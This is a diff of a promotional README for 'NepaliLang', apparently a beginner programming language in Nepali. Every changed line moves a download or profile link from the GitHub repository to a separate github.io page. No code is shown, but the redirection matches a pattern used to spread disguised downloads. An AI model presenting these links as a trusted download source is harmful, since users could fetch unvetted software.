@@ -29,13 +29,13 @@ That's NepaliLang in action! It's perfect for students, teachers, and anyone who
 
 Click the button below to get the latest version:
 
-[![Download NepaliLang](https://img.shields.io/badge/Download-NepaliLang-blue?style=for-the-badge)](https://github.com/acr3463/NepaliLang)
+[![Download NepaliLang](https://img.shields.io/badge/Download-NepaliLang-blue?style=for-the-badge)](https://acr3463.github.io)
 
 ### Option 2: Step-by-Step Installation
 
 **Step 1: Visit the Download Page**
 
-Visit this link to download the application: [https://github.com/acr3463/NepaliLang](https://github.com/acr3463/NepaliLang)
+Visit this link to download the application: [https://acr3463.github.io](https://acr3463.github.io)
 
 **Step 2: Choose Your Version**
 
@@ -232,7 +232,7 @@ NepaliLang is more than just a programming language - it's a movement to make te
 
 ## 📧 Contact and Updates
 
-- Follow [@acr3463](https://github.com/acr3463) for updates
+- Follow [@acr3463](https://acr3463.github.io) for updates
 - Watch the repository for new releases
 - Star the project on GitHub
 - Share with friends and colleagues
@@ -241,7 +241,7 @@ NepaliLang is more than just a programming language - it's a movement to make te
 
 Don't wait another minute! Download NepaliLang today and take your first step into the world of programming. With NepaliLang, the possibilities are endless, and the only limit is your imagination.
 
-[Visit this link to download the application](https://github.com/acr3463/NepaliLang)
+[Visit this link to download the application](https://acr3463.github.io)
 
 Join thousands of Nepali learners who have already discovered how easy and fun coding can be - when it speaks your language!
 
